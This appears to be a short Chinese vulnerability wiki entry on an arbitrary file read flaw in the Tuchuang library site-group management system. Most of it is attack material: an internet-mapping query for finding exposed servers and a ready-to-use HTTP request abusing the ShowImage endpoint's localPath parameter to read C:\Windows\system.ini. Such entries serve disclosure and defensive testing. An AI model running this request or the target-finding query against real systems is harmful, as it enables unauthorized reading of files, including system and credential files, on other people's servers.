## 漏洞描述

图创软件 图书馆站群管理系统 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件

## 漏洞影响

```
图创软件 图书馆站群管理系统
```

## 网络测绘

```
"广州图创" && country="CN" && body="/interlib/common/"
```



## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101854438.png)

漏洞请求包为



```plain
GET /interlib/report/ShowImage?localPath=C:\Windows\system.ini HTTP/1.1
Host: 
Content-Length: 4
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101854283.png)



成功读取 system.ini 文件
